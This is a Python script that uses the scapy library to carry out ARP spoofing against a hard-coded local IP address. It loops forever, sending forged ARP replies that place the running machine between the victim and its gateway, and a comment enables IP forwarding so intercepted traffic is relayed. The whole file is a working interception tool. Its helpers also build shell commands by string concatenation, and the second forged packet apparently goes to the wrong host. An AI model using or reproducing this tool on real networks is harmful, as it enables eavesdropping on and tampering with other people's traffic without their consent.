import os
import re
import time

from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, sendp

UNKNOWN_MAC = 'ff:ff:ff:ff:ff:ff'
PATTERN = '\w\w:\w\w:\w\w:\w\w:\w\w:\w\w'


def get_mac_address(network):
    temp = os.popen('ifconfig ' + network)
    result = temp.readlines()
    for item in result:
        condition = re.search(PATTERN, item)
        if condition:
            return condition.group(0)


def get_ip_address(network):
    temp = os.popen('ifconfig ' + network)
    result = temp.readlines()
    local_ip = None
    for item in result:
        if 'inet addr:' in item:
            local_ip = str(item).split('inet addr:')[1].split('Bcast:')[0].strip()
            break
    return local_ip


def get_gateway(network):
    temp = os.popen("route -n | grep " + network + " | grep UG | awk '{print $2}'")
    result = temp.read()
    return str(result).strip()


def get_mac_from_ip(ip, network='ens33'):
    local_ip = get_ip_address(network)
    ip_list = local_ip + '/24'

    temp = srp(Ether(dst=UNKNOWN_MAC) / ARP(pdst=ip_list),
               timeout=3, verbose=False, iface=network)
    result = temp[0].res
    for item in result:
        target_mac = item[1].getlayer(ARP).fields['hwsrc']
        target_ip = item[1].getlayer(ARP).fields['psrc']
        if str(target_ip) == str(ip):
            return target_mac
    return UNKNOWN_MAC


def arp_spoof(target_ip, network='ens33'):
    gateway = get_gateway(network)
    gateway_mac = get_mac_from_ip(gateway)
    local_mac = get_mac_address(network)
    target_mac = get_mac_from_ip(target_ip)

    while True:
        # OP1:WHO IS OP2:IS AT
        sendp(Ether(src=local_mac, dst=target_mac) /
              ARP(hwsrc=local_mac, hwdst=target_mac, psrc=gateway, pdst=target_ip, op=2),
              verbose=False, iface=network)
        sendp(Ether(src=local_mac, dst=target_mac) /
              ARP(hwsrc=local_mac, hwdst=target_mac, psrc=target_ip, pdst=gateway, op=2),
              verbose=False, iface=network)
        time.sleep(1)


if __name__ == '__main__':
    # sysctl net.ipv4.ip_forward=1
    arp_spoof('172.16.12.132')
